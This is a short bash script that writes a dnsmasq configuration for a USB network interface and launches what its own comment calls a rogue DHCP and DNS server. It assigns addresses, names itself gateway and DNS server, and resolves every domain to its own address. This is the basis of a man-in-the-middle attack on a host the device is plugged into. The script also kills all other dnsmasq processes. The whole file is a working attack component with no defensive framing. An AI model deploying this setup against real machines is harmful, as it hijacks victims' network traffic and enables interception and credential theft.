#!/bin/bash
# Start rogue DHCP and DNS server using dnsmasq

cat << EOC > /tmp/dnsmasq-usb0.conf
domain-needed
bogus-priv
interface=usb0
dhcp-range=10.0.0.50,10.0.0.150,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOC

pkill dnsmasq
sleep 1

sudo dnsmasq -C /tmp/dnsmasq-usb0.conf -d
